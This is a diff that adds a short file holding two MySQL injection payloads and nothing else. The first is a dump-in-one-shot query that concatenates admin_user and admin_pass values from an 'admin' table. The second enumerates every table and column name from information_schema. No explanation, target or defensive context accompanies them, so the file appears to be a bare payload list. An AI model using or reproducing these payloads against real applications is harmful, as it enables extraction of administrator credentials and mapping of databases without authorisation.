@@ -1,0 +1,8 @@
+
+
+(SELECT(@x)FROM(SELECT(@x:=0x00)+,(SELECT(@x)FROM(admin)WHERE(@x)IN(@x:=CONCAT(0x20,@x,admin_user,0x3a,admin_pass,0x3c62723e))))x)
+
+
+
+
+concat(@c:=0x00,if((select count(*) from information_schema.columns where table_schema not like 0x696e666f726d6174696f6e5f736368656d61 and @c:=concat(@c,0x3c62723e,table_name,0x3a,column_name)),0x00,0x00),@c)
